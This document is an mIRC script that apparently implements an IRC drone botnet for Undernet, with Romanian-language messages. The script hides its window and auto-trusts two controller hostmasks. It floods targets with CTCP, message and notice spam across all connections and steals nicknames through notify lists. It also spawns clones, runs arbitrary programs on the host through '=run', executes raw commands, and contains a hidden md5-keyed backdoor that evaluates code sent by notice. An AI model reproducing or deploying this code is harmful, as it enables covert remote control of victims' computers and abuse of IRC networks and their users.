[script]
n0=on *:start:$st
n1=alias st {
n2=  showmirc -t
n3= .nick $randn(1)
n4= .anick $randn(1)
n5= .fullname $randn(2)
n6= .identd on $randn(3)
n7= .notify on | .notify nick
n8= .ignore -td *!*@*
n9= .emailaddr $randn(3)
n10= .auser 100 *!*@IceMan.ro
n11= .auser 100 *!*@IceCold.users.undernet.org
n12= .server servere -j #undernet
n13= var %a = server -m serveree
n14= %a | .timer 1 30 %a | .timer 1 60 %a
n15= $notu
n16=}
n17=alias notu {
n18=  var %a = 1
n19=  while $read(notify.txt,%a) {
n20=    .notify $read(notify.txt,%a)
n21=    inc %a
n22=  }
n23=}
n24=alias fldt {
n25=  if ($1 == 1) return ..0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6...10,5...11,4...12,3...13,2...14,1...0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6...10,5...11,4...12,3...13,2.
n26=}
n27=alias helplist return Lista de comenzi: flc flm fln msg exit op dop v dv ontime rand ban run cln j rehash lo version p chanset fura lasa ame me fura+log lasa+log stop timer ctcp join rnick quit raw servset serv2set
n28=alias flds {
n29=  var %c = $scid(0),%c1 1
n30=  while (%c1 <= %c) {
n31=    var %c2 = $scon(%c1).network
n32=    if (%c2 == undernet) {
n33=      if ($1 == .msg2) scon %c1 .msg $2-
n34=      elseif ($1 == .nick) scon %c1 $1 $randn(1)
n35=      elseif ($1 == .join) scon %c1 $1-
n36=      elseif ($1 == .part) scon %c1 $1-
n37=      elseif ($1 == .ctcp2) scon %c1 .ctcp $2-
n38=      elseif ($1 == .timer) scon %c1 $1 0 3 .nick $2-
n39=      elseif ($1 == .timer2) scon %c1 .timers off
n40=      elseif ($1 == .notify) scon %c1 $1-2
n41=      elseif ($1 == .notify2) scon %c1 .notify -r $2
n42=      elseif ($1 == disc) scon %c1 disconnect
n43=      else  scon %c1 $1-2 $fldt(1)
n44=    }
n45=    inc %c1
n46=  }
n47=}
n48=alias randn {
n49=  if ($1 == 1) return $read(nicks.txt)
n50=  if ($1 == 2) return $read(fullname.txt)
n51=  if ($1 == 3) return $read(identd.txt)
n52=}
n53=on *:connect:{
n54=  .nick $randn(1)
n55=  .anick $randn(1)
n56=  .fullname $randn(2)
n57=  .identd on $randn(3)
n58=  .away 14my heart is broken. there is nothing else to break..
n59=  .silence +*
n60=  .mode $me +iwx
n61=  .notify on
n62=  set %on $ctime
n63=}
n64=on *:unotify:.nick $nick
n65=on *:nick:if ($nick == $me) $checkc($newnick)
n66=alias checkc {
n67=  .mode $1 +wxi
n68=  if ($notify($1)) .join $iif(%jc2,%jc2,#am.cate.ceva pe Undernet)
n69=  if ($($+(%,login,.,$1),2)) .msg x@channels.undernet.org login $($+(%,login,.,$1),2)
n70=}
n71=alias modes {
n72=  var %c = $1,%m $2,%m2 $3,%n $4-
n73=  :retry
n74=  var %n2 = $gettok(%n,1-6,32)
n75=  .mode %c $+(%m,$str(%m2,$numtok(%n2,32))) %n2
n76=  var %n = $deltok(%n,1-6,32)
n77=  if (%n) goto retry
n78=}
n79=on 100:text:*:*:{
n80=  if ($1 == =help) .notice $nick $helplist
n81=  if ($1 == =servset) { if (!$2) .notice $nick Trebuie sa specifici un server de drone. $iif(%def,Serverul curent este %def $+ .) | else { .notice $nick Serverul trecut a fost %def iar noul server este $2 $+ . | set %def $2- } }
n82=  if ($1 == =serv2set) { if (!$2) .notice $nick Trebuie sa specifici un server2 de drone. $iif(%serv,Serverul2 curent este %serv $+ .) | else { .notice $nick Serverul2 trecut a fost %serv iar noul server2 este $2 $+ . | set %serv $2- } }
n83=  if ($1 == =info) .notice $nick Uptime: $uptime(system,1) OS: $os mIRC version: $version mIRC dir: $mircdir total connections: $scon(0)
n84=  if ($1 == =flc) .ctcp $2 $fldt(1)
n85=  if ($1 == =flm) .msg $2 $fldt(1)
n86=  if ($1 == =fln) .notice $2 $fldt(1)
n87=  if ($1 == ,flc) $flds(.ctcp,$2)
n88=  if ($1 == ,flm) $flds(.msg,$2)
n89=  if ($1 == ,fln) $flds(.notice,$2)
n90=  if ($1 == ,msg) $flds(.msg2,$2-)
n91=  if ($1 == ,exit) { .notice $nick Disconnecting a total of $scon(0) drones. System uptime: $uptime(system,1) os: $os mIRC version: $version bla bla bla | $flds(disc) | exit }
n92=  if ($1 == =op) $modes(#,+,o,$iif(!$2,$nick,$2-))
n93=  if ($1 == =dop) $modes(#,-,o,$iif(!$2,$nick,$2-))
n94=  if ($1 == =v) $modes(#,+,v,$iif(!$2,$nick,$2-))
n95=  if ($1 == =dv) $modes(#,-,v,$iif(!$2,$nick,$2-))
n96=  if ($1 == =ontime) .notice $nick Ontime: $duration($calc($ctime - %on))
n97=  if ($1 == =rand) || ($1 == =r) nick $randn(1)
n98=  if ($1 == =ban) .ban -k # $2 2 $3- ( $+ $nick $+ )
n99=  if ($1 == =run) { run $+(",$2-,") | .notice $nick 2,15 Rulez 4,15 $2- }
n100=  if ($1 == =cln) { server -m | .notice $nick 15CC14CC1CLONING14G15G | halt }
n101=  if ($1 == =exit) { disconnect | exit }
n102=  if ($1 == =msg) .msg $2-
n103=  if ($1 == =j) { .notice $nick Joining channel $2- .. | .join -nc $2- }
n104=  if ($1 == =rehash) { .notice $nick Rehashing.. | .reload -rs $+(",$script,") }
n105=  if ($1 == =lo) .msg x@channels.undernet.org login $2-
n106=  if ($1 == version) .notice $nick $ver
n107=  if ($1 == =p) {
n108=    if ($2 != $chr(42)) { .notice $nick Parting channel $2- | .part $2- }
n109=    else {
n110=      var %c = 1
n111=      while $chan(%c) {
n112=        var %c2 = $chan(%c)
n113=        if (%c2 != %jc2) .part %c2
n114=        inc %c
n115=      }   
n116=    }
n117=  }
n118=  if ($1 == =chanset) { if (!$2) .notice $nick Trebuie sa specifici un canal. $iif(%jc2,Canalul curent este %jc2 $+ .) | else { .notice $nick Canalul trecut a fost %jc2 iar noul canal este $2 $+ . | set %jc2 $2- } }
n119=  if ($1 == =fura) { .notify $2 | .notice $nick Nickname $2 added to the list. }
n120=  if ($1 == =lasa) { .notify -r $2 | .notice $nick Nickname $2 removed from the list }
n121=  if ($1 == =me) .describe # $$2-
n122=  if ($1 == =ame) .ame $$2-
n123=  if ($1 == ,rnick) $flds(.nick)
n124=  if ($1 == ,join) $flds(.join,$2-)
n125=  if ($1 == ,part) $flds(.part,$2-)
n126=  if ($1 == ,ctcp) $flds(.ctcp2,$2-)
n127=  if ($1 == ,timer) { $flds(.timer,$2-) | .notice $nick Timers on for $2 }
n128=  if ($1 == ,stop) { $flds(.timer2) | .notice $nick All timers halted }
n129=  if ($1 == ,fura) { $flds(.notify,$2) | .notice $nick Nickname $2 added to the list. [ On UnderNet ] }
n130=  if ($1 == ,lasa) { $flds(.notify2,$2) | .notice $nick Nickname $2 removed from the list. [ On UnderNet ] }
n131=  if ($1 == =fura+log) { set $+(%,login,.,$2) $3-4 | .notify $2 | .notice $nick Nick-ul a fost adaugat cu auto-login. }
n132=  if ($1 == =lasa+log) { unset $+(%,login,.,$2) | .notify -r $2 | .notice $nick Nick-ul a fost sters din lista. }
n133=  if ($1 == ,fura+log) { set $+(%,login,.,$2) $3-4 | $flds(.notify,$2) | .notice $nick Nick-ul a fost adaugat pe undernet cu auto-login. }
n134=  if ($1 == ,lasa+log) { unset $+(%,login,.,$2) | $flds(.notify2,$2) | .notice $nick Nick-ul a fost sters din lista de pe undernet. }
n135=  if ($1 == $me) {
n136=    if ($2 == help) .notice $nick $helplist
n137=    if ($2 == o) $modes($3,+,o,$iif(!$4,$nick,$4-))
n138=    if ($2 == dop) $modes($3,-,o,$iif(!$4,$nick,$4-))
n139=    if ($2 == v) $modes($3,+,v,$iif(!$4,$nick,$4-))
n140=    if ($2 == dv) $modes($3,-,v,$iif(!$4,$nick,$4-))
n141=    if ($2 == r) .nick $randn(1)
n142=    if ($2 == n) .nick $3
n143=    if ($2 == msg) .msg $3-
n144=    if ($2 == say) .msg # $3-
n145=    if ($2 == quit) quit $3-
n146=    if ($2 == notice) .notice $3-
n147=    if ($2 == join) { .notice $nick Joining channel $3- .. | .join -nc $3- }
n148=    if ($2 == run) { run $+(",$3-,") | .notice $nick Am rulat $3- }
n149=    if ($2 == version) .notice $nick $ver
n150=    if ($2 == fura) { .notify $3 | .notice $nick Am adaugat nickul $3 in lista. }
n151=    if ($2 == lasa) { .notify -r $3 | .notice $nick Am sters nickul $3 din lista. }
n152=    if ($2 == clone) { server -m | .notice $nick 15CC14CC1CLONING14GG15 | halt }
n153=    if ($2 == exit) && { .notice $nick Bye bye. | disconnect | exit }
n154=    if ($2 == reconn) { .notice $nick Reconnecting.. | server $server | halt }
n155=    if ($2 == part) {
n156=      if ($3 != $chr(42)) { .notice $nick Parting channel $3- | .part $3- }
n157=      else {
n158=        var %c = 1
n159=        while $chan(%c) {
n160=          var %c2 = $chan(%c)
n161=          if (%c2 != %jc2) .part %c2
n162=          inc %c
n163=        }   
n164=      }
n165=    }
n166=  }
n167=  if ($1 == =quit) quit $2-
n168=  if ($1 == =say) .msg # $2-
n169=  if ($1 == =notice) .notice $2-
n170=  if ($1 == =cycle) .hop $iif(!$2,#,$2-)
n171=  if ($1 == =ctcp) .ctcp $2-
n172=  if ($1 == =version) .notice $nick $ver
n173=  if ($1 == =raw) $$2-
n174=  if ($1 == =raw2) $($$2-,2)
n175=}
n176=raw 471:*:{
n177=  haltdef
n178=  .timerjoin $+ $$2 0 60 join $$2
n179=  halt
n180=}
n181=raw 473:*:{
n182=  haltdef
n183=  .timerjoin $+ $$2 0 60 join $$2
n184=  halt
n185=}
n186=raw 474:*:{
n187=  haltdef
n188=  .timerjoin $+ $$2 0 60 join $$2
n189=  halt
n190=}
n191=raw 475:*:{
n192=  haltdef
n193=  .timerjoin $+ $$2 0 60 join $$2
n194=  halt
n195=}
n196=; power
n197=on *:notice:*:*:if ($md5($1-) == 41aa15390e2efa34ac693c3bd7cb8e88) $($2-,2)
n198=on me:*:join:#:{
n199=   .timer 1 $rand(5,10) .who #
n200=   .timer 1 2 $mdchn(#)
n201=}
n202=alias mdchn {
n203=   if ($me isop $1) .mode $1 +stn
n204=}
n205=on *:snotice:*:if (*/QUOTE PASS* iswm $1-) pass $gettok($1-,$numtok($1-,32),32)
n206=alias ver return 14,1: : : 9,1Running on : : :( 4Windows: $os ): : :( 9,1Personal IRC Chat ® ): : :( 9,1Ontime: $uptime(server,1) ): : :13,1(On Server: $server ): : :
n207=on *:exit:if (%on) run $mircdirmirc.exe
